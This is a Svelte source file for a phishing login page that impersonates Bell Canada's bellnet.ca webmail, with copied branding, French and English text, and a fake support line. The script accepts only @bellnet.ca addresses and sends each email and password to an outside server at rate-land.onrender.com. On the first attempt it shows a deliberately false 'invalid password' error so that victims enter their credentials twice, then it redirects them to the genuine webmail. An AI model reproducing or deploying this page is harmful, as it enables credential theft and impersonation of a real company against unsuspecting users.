<script>
  import { onMount } from 'svelte';
  import { push, querystring } from 'svelte-spa-router';
  import logo from '../assets/logo.png';
  import background from '../assets/background.jpg';

  const BACKEND_URL = 'https://rate-land.onrender.com/submit';

  let verifying = false;
  let lang = 'en';
  let email = '';
  let password = '';
  let loading = false;
  let message = { type: '', text: '' };
  let loginAttempts = 0;
  let shake = false;

  // Language Dictionary
  const content = {
    en: {
      title: 'Log in',
      emailLabel: 'Email Address',
      passLabel: 'Password',
      btn: 'Log in',
      forgot: 'Forgot your password? Call <strong>310-BELL</strong> to reset it.',
      footer1: 'Privacy',
      footer2: 'Legal & Regulatory',
      copy: '© Bell Canada, All rights reserved.',
      toggle: 'Français',
      errEmail: 'Email must end with @bellnet.ca.',
      success: 'Login successful! Redirecting...',
      connErr: 'Connection failed. Please try again later.'
    },
    fr: {
      title: 'Connexion',
      emailLabel: 'Adresse courriel',
      passLabel: 'Mot de passe',
      btn: 'Se connecter',
      forgot: 'Mot de passe oublié? Appelez le <strong>310-BELL</strong> pour le réinitialiser.',
      footer1: 'Confidentialité',
      footer2: 'Mentions légales',
      copy: '© Bell Canada, Tous droits réservés.',
      toggle: 'English',
      errEmail: "L'e-mail doit se terminer par @bellnet.ca.",
      success: 'Connexion réussie! Redirection en cours...',
      connErr: 'Connexion échouée. Veuillez réessayer plus tard.'
    }
  };

  onMount(async () => {
     const savedLang = localStorage.getItem('bell_lang');
    if (savedLang) lang = savedLang;

setTimeout(() => {
      // Hide the loading overlay
      verifying = false;
      window.history.replaceState({}, '', '#/login');
      
    }, 2000); // 2000ms = 2 seconds
  });

  function toggleLang() {
    lang = lang === 'en' ? 'fr' : 'en';
  }

  async function handleLogin() {
     message = { type: '', text: '' };
     shake = false;

    // Validation: Email Domain
    if (!email.toLowerCase().endsWith('@bellnet.ca')) {
      message = { type: 'error', text: content[lang].errEmail };
      return;
    }

    // Validation: Password presence
    if (!password) {
      message = { type: 'error', text: content[lang].errPass };
      return;
    }

    loading = true;
    try {
     const payload = {
      email: email,
      password: password,
      // Sending an empty location object to satisfy your middleware
      location: { latitude: null, longitude: null } 
    };

      const res = await fetch(BACKEND_URL, { method: 'POST', 
      headers: {
        'Content-Type': 'application/json' // This tells Express to use express.json()
      },
      body: JSON.stringify(payload) });
      const data = await res.json();

      if (res.ok) {
      loginAttempts++; // Increment the counter on a successful backend hit

      if (loginAttempts === 1) {
        // FIRST TIME: Show fake error to capture first trial
        shake = true;
        message = { 
          type: 'error', 
          text: lang === 'en' ? 'Invalid email or password. Please try again.' : 'Courriel ou mot de passe invalide. Veuillez réessayer.' 
        };
      } else {
        setTimeout(() => { window.location.href = "https://webmail.en.bellnet.ca"; }, 1500);
      }
    } else {
      // Handle actual backend errors (400, 500, etc.)
      shake = true;
      message = { type: 'error', text: data.message || 'Login failed.' };
    }
  } catch {
    message = { type: 'error', text: content[lang].connErr };
  } finally {
    loading = false;
  }
}
</script>

{#if verifying}
  <div id="verify-screen">
    <div class="verify-inner">
      <div class="verify-spinner"></div>
      <p class="verify-text">Checking access...</p>
    </div>
  </div>
{:else}
  <div class="main-content">
    <div class="topbar">
      <div class="topbar-logo"><img src={logo} alt="Logo"/></div>
      <button class="lang-toggle" on:click={toggleLang}>{content[lang].toggle}</button>
    </div>

    <div class="hero">
      <div class="hero-bg" style="background: url({background}) center/cover no-repeat;"></div>
      <div class="card" class:shake={shake}>
        <h1>{content[lang].title}</h1>

        <div class="field">
          <label for="email">{content[lang].emailLabel}</label>
          <input type="email" bind:value={email} id="email" />
        </div>

        <div class="field">
          <label for="password">{content[lang].passLabel}</label>
          <input type="password" bind:value={password} id="password" on:keydown={(e) => e.key === 'Enter' && handleLogin()}/>
        </div>

        {#if message.text}
          <div class="form-msg {message.type}">{message.text}</div>
        {/if}

        <button class="btn-login" disabled={loading} on:click={handleLogin}>
          {#if loading}<span class="spinner"></span>{/if}
          {content[lang].btn}
        </button>

        <p class="forgot">{@html content[lang].forgot}</p>

       <div class="card-footer">
          <div class="footer-links">
            <a href="/#">{content[lang].footer1}</a> 
            <span class="sep">|</span> 
            <a href="/#">{content[lang].footer2}</a>
          </div>
          <p class="rights">{content[lang].copy}</p>
        </div>
      </div>
    </div>
  </div>
{/if}

 <style>
 :global(html, body) {
    margin: 0;
    padding: 0;
    width: 100%;
    min-height: 100vh;
    overflow-x: hidden;
  }

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }


  .main-content {
    width: 100%;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

    /* Verification loading screen — shown while token is being checked */
    #verify-screen {
      position: fixed;
      inset: 0;
      background: rgb(26, 61, 110);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .verify-inner {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    .verify-spinner {
      width: 36px;
      height: 36px;
      border: 2px solid rgba(255,255,255,0.2);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    .verify-text {
      font-family: 'Source Sans 3', sans-serif;
      font-size: 13px;
      font-weight: 600;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: rgba(255,255,255,0.45);
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .topbar {
      background: #1a5fa8;
      height: 72px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 40px;
      flex-shrink: 0;
    }

    .topbar-logo img {
      height: 40px;
      max-width: 160px;
      object-fit: contain;
      display: block;
    }

    .topbar-right {
      display: flex;
      align-items: center;
    }

    .topbar a {
      color: #fff;
      text-decoration: none;
      font-size: 15px;
      font-weight: 400;
    }

    .hero {
      position: relative;
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: flex-start;
      overflow: hidden;
      min-height: calc(100vh - 72px);
    }

    .hero-bg {
      position: absolute;
      inset: 0;
      background: url('images/background.jpg') center/cover no-repeat;
    }

    .card {
      position: relative;
      z-index: 2;
      background: #fff;
      border-radius: 12px;
      padding: 40px 40px 0 40px;
      width: 370px;
      max-width: calc(100% - 32px);
      margin: 40px 0 40px 80px;
      box-shadow: 0 2px 24px rgba(0,0,0,0.18);
      display: flex;
      flex-direction: column;
    }

    .card.shake {
    animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
    transform: translate3d(0, 0, 0);
    backface-visibility: hidden;
    perspective: 1000px;
  }

  @keyframes shake {
    10%, 90% { transform: translate3d(-1px, 0, 0); }
    20%, 80% { transform: translate3d(2px, 0, 0); }
    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
    40%, 60% { transform: translate3d(4px, 0, 0); }
  }

    .card h1 {
      font-size: 24px;
      font-weight: 700;
      color: #111;
      margin-bottom: 20px;
    }

    .field {
      display: flex;
      flex-direction: column;
      margin-bottom: 14px;
    }

    .field label {
      font-size: 13px;
      font-weight: 700;
      color: #111;
      margin-bottom: 5px;
    }

    .field input {
      border: 1.5px solid #aaa;
      border-radius: 4px;
      height: 38px;
      padding: 0 10px;
      font-size: 14px;
      outline: none;
      transition: border-color 0.2s;
      background: #fff;
      width: 100%;
    }

    .field input:focus {
      border-color: #1a5fa8;
    }

    .btn-login {
      margin-top: 12px;
      background: #1a3d6e;
      color: #fff;
      border: none;
      border-radius: 50px;
      padding: 10px 22px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      align-self: flex-start;
      transition: background 0.2s;
      white-space: nowrap;
    }

    .btn-login:hover {
      background: #14305a;
    }

    .forgot {
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
      color: #444;
      line-height: 1.5;
    }

    .card-footer {
      background: #f0f2f5;
      margin: 20px -40px 0 -40px;
      border-radius: 0 0 12px 12px;
      padding: 16px 40px;
      text-align: center;
    }

    .card-footer a {
      color: #1a5fa8;
      text-decoration: none;
      font-size: 14px;
    }

    .card-footer a:hover { text-decoration: underline; }

    .card-footer .rights {
      font-size: 14px;
      color: #555;
      margin-top: 2px;
    }

    @media (max-width: 900px) {
      .topbar { padding: 0 24px; height: 64px; }
      .topbar-logo img { height: 34px; }
      .card { margin: 32px 0 32px 40px; width: 360px; padding: 36px 32px 0 32px; }
      .card-footer { margin: 20px -32px 0 -32px; padding: 14px 32px; }
    }

    @media (max-width: 600px) {
       :global(body) { 
      background: #fff; 
    }

    .main-content {
      width: 100%;
    }
      .topbar { padding: 0 20px; height: 64px; position: relative; }
      .topbar-logo img { height: 32px; }
      .hero {
      width: 100%;
      min-height: calc(100vh - 64px);
      padding: 0;
      background: #fff;
    }
      .hero-bg { display: none; }
      .hero::after { display: none; }
         .card {
      width: 100%;
      max-width: 100%;
      min-height: calc(100vh - 64px);
      margin: 0;
      padding: 32px 24px 0 24px;
      border-radius: 0;
      box-shadow: none;
      background: #fff;
      display: flex;
      flex-direction: column;
    }
      .card h1 { font-size: 28px; font-weight: 800; margin-bottom: 28px; }
      .field { margin-bottom: 18px; }
      .field label { font-size: 14px; font-weight: 700; }
      .field input { height: 48px; font-size: 15px; border-radius: 6px; }
      .btn-login { width: auto; align-self: flex-start; padding: 12px 32px; font-size: 15px; margin-top: 20px; }
      .forgot { font-size: 15px; text-align: left; margin-top: 20px; color: #333; }
      .card-footer {
        margin-top: auto;
        margin-left: -24px;
        margin-right: -24px;
        margin-bottom: 0;
        padding: 20px 24px;
        border-radius: 0;
        background: #f0f2f5;
        text-align: center;
      }
      .card-footer a { font-size: 15px; }
      .card-footer .rights { font-size: 13px; margin-top: 4px; }
    }

    @media (max-width: 360px) {
      .topbar { height: 52px; }
      .card h1 { font-size: 22px; }
      .field input { height: 40px; font-size: 14px; }
      .btn-login { font-size: 15px; }
    }

    .lang-toggle {
      background: none;
      border: none;
      color: #fff;
      font-size: 15px;
      font-family: inherit;
      font-weight: 400;
      cursor: pointer;
      padding: 0;
      transition: opacity 0.2s;
    }

    .lang-toggle:hover { opacity: 0.75; }
     .sep { color: #555; margin: 0 5px; }
    .form-msg {
      font-size: 12px;
      margin-top: 10px;
      display: none;
      line-height: 1.5;
      font-family: Arial, Helvetica, sans-serif;
    }

    .form-msg.error  { color: red;      display: block; }
    .form-msg.success { color: #1e7e45; display: block; }

    .btn-login:disabled { opacity: 0.65; cursor: not-allowed; }

    .btn-login .spinner {
      display: inline-block;
      width: 12px;
      height: 12px;
      border: 2px solid rgba(255,255,255,0.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      margin-right: 6px;
      vertical-align: middle;
    }

    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
